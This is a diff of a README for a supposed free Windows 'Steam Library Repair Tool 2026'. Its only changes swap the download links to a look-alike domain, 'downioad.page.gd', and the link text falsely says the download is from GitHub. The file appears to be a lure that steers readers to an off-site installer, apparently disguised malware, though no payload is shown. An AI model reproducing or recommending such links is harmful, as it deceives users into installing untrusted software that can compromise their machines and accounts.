@@ -2,7 +2,7 @@
 
 Welcome to the Steam Library Repair Tool 2026, your go-to solution for fixing Steam library issues on Windows. This tool is designed to automatically detect and repair common errors that prevent games from being recognized or played correctly, ensuring a smooth gaming experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,4 +60,4 @@ Absolutely! The Steam Library Repair Tool is completely free and open-source, wi
 
 To get the latest version of the Steam Library Repair Tool, please visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
